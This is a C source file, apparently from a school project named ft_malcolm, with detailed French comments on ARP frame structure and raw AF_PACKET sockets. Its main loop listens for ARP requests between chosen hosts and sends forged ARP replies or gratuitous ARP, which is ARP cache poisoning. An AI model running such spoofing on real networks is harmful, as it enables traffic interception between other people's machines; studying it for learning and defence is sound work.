#include "main.h"

//Detaille d'une trame arp (hexadecimal) taille max 1500 octects (a la fin possible padding (0000000000)):
// |------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
// |                                                                      Entete ethernet                                                                                     |                                                                                                                                                                                                                                                                                                                                               Entete ARP                                                                                                                                                                                                                                                                                                                                                            |
// |------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
// | Adresse MAC de Destination du paquet (6 octect) | Adresse MAC de l'emetteur du paquet (6 octect) | Type de protocole encapsule dans la trame (2 octects) (Pour arp 0806) |                 Type de hardware (2 octects) (Ethernet = 0001)            | Type de protocole reseau en general IPv4 (2 octects) (0800 pour IPv4) |  Longueur adresse MAC en octect (1 octect) (en general 06) | Longueur adresse IP en octect (1 octect 04) | Type de message (2 octects) (0001 request 0002 response) | Adresse MAC de l'émetteur de la requête ou de la réponse (6 octect en focntion de precedent) | Adresse IP de l'émetteur de la requête ou de la réponse (4 octect en focntion de precedent) | Adresse MAC du destinataire de la requête ou de la réponse Inconnue et remplie de zéros dans une requête (6 octects) | Adresse IP du destinataire de la requête ou de la réponse (4 octects) |
// |------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
// |                FF FF FF FF FF FF                |               02 42 AC 1A 00 03                |                                  08 06                                |                                     00 01                                 |                                  08 00                                |                               06                           |                       04                    |                          00 01                           |                                        02 42 AC 1A 00 03                                     |                                       AC 1A 00 03                                           |                                                   00 00 00 00 00 00                                                  |                             AC 1A 00 01                               |
// |------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|

//Detail de la structure sockaddr_ll : 
//struct sockaddr_ll{
//  unsigned short ssl_family (famille d'adresse de la socket normalement toujours AF_PACKET)
//  unsigned short ssl_protocol (Protocol de la couche 2 pour lequel cette adresse s'applique (htons(ETH_P_ALL)))
//  int ssl_ifindex (interface reseau sur laquelle la trame est recu. Pour voir les interfaces et leurs numero sur un systeme on utilise ip link show)
//  unsigned short sll_hatype (Type de matériel associé à l'adresse. Par exemple, pour Ethernet, cela peut être ARPHRD_ETHER)
//  unsigned char sll_pkttype (Type de paquet associé à l'adresse. Il peut s'agir de types de paquets spécifiques tels que PACKET_HOST, PACKET_BROADCAST, PACKET_MULTICAST)
//  unsigned char sll_halen (Longueur de l'adresse mac en octect)
//  unsigned char sll_addr[8] (Tableau contenant l'adresse mac. La taille du tableau est sll_halen)
//}

//Pour recuperer toutes les communications qui arrive sur notre machine on utilise des RAW Sockets qui vont permettre de manipuler/composer
//soi-meme la partie IP du modele OSI. Avec des sockets normal on peut aussi agir sur cette partie mais pas autant on sera plutot sur la partie 4 du modele OSI.
//On va pouvoir aussi avec ce genre de socket recuperer les requetes broadcast et multicast.
//Je met sockRaw en variable globale pour pouvoir quand je recois un signal CTRL + V quitter proprement le programme

int sockRaw = 0;

void sig(int sig)
{
    printf("Catch signal %d : CTRL + C stop ft_malcolm\n", sig);
    close(sockRaw);
    sockRaw = -1;
}

int main(int argc, char **argv)
{
    signal(SIGINT, sig);
    struct network_frame network_frame_info;
    if (!parse_arg(argv, argc, &network_frame_info.arg_addr, &network_frame_info.network_interface))
        return (1);
    char buf[SIZE_MAX_ARP];
    socklen_t len = sizeof(network_frame_info.network_interface);

    //Pour creer une RAW socket on donne a socket comme type (2eme arg) SOCK_RAW. Comme domaine (1er arg) AF_PACKET qui va permettre d'accerder au donnes brut
    //incluant les entetes ethernet (couche 2 modele OSI) et IP (couche 3 modele OSI). Ensuite on renseigne le protocol ce sera le type de trame que l'on veut
    //'capturer' il en existe plusieur pour le trame IP, ARP, VLAN et il existe un moyen de tout capturer (ETH_P_ALL) on utilisera ETH_P_ARP pour les trames ARP
    // car il n y'a que celle ci qui nous interesse. Mais typiquement les logiciels de sniffing tel que wireshark utilise ETH_P_ALL. Le kernel a chaque fois
    //qu'il recoit une trame et qu'elle doit aussi aller a notre socket cree un copie de cette trame et l'envoie a la socket.
    //REF (https://stackoverflow.com/questions/62866943/how-does-the-af-packet-socket-work-in-linux et man 7 packet et linux/if_ether.h)
    
    sockRaw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sockRaw < 0)
        return(printf("socket failed : %s\n", strerror(errno)), 1);
    while(sockRaw != -1)
    {        
        if (network_frame_info.arg_addr.unicast == 1)//Attend qu'une source veuille communiquer avec une cible, marche en one shot
        {
            ssize_t recv = recv_frame(&sockRaw, buf, &network_frame_info, &len);
            if (recv <= 0)
                return (close(sockRaw), 1);

            if (ft_memcmp(network_frame_info.recv_frame.sender_mac, network_frame_info.arg_addr.arg_mac_addr_src, ETH_ALEN) == 0 && ft_memcmp(network_frame_info.recv_frame.sender_ip, network_frame_info.arg_addr.arg_ip_addr_src, 4) == 0 && (ft_memcmp(network_frame_info.recv_frame.target_mac, network_frame_info.arg_addr.arg_mac_addr_target, ETH_ALEN) == 0 || ft_memcmp(network_frame_info.recv_frame.target_mac, "\0\0\0\0\00\0\0", ETH_ALEN) == 0) && ft_memcmp(network_frame_info.recv_frame.target_ip, network_frame_info.arg_addr.arg_ip_addr_target, 4) == 0)
            {
                /*Creation de la trame arp retour falsifie*/

                if (!(create_frame_unicast_request(&network_frame_info.send_frame, &network_frame_info.recv_frame, argv[3], network_frame_info.arg_addr.verbose)))
                    return(close(sockRaw), 1);
                if (!(send_frame(sockRaw, &network_frame_info)))
                    return (close(sockRaw), 1);
                if (network_frame_info.arg_addr.verbose == 1)
                    print_information(buf, &network_frame_info, recv);
                fflush(stdout);
                memset(&network_frame_info.network_interface, 0, sizeof(struct sockaddr_ll));
                memset(buf, 0, SIZE_MAX_ARP);
                memset(&network_frame_info.recv_frame, 0, sizeof(struct arp_frame));
                break;
            }
        }
        else if (network_frame_info.arg_addr.gratuitous == 1) //Ne fonctionne pas si pas l'adresse ip n'est pas deja rentre sur les machines, marche en one shot
        {
            if (!(create_frame_gatuitous(&network_frame_info.send_frame, argv[2], network_frame_info.arg_addr.verbose)))
                return (close(sockRaw), 1);
            if (send_frame(sockRaw, &network_frame_info) == -1)
                return (close(sockRaw), 1);
            if (network_frame_info.arg_addr.verbose == 1)
            {
                print_network_interface(&network_frame_info.network_interface);
                print_arp_frame(&network_frame_info.send_frame, "Send Trame");
            }
            fflush(stdout);
        }
        memset(&network_frame_info.send_frame, 0, sizeof(struct arp_frame));
    }
    close(sockRaw);
    return(0);
}

// Bonus: gartuitous arp, selectionner interfasce, verbose.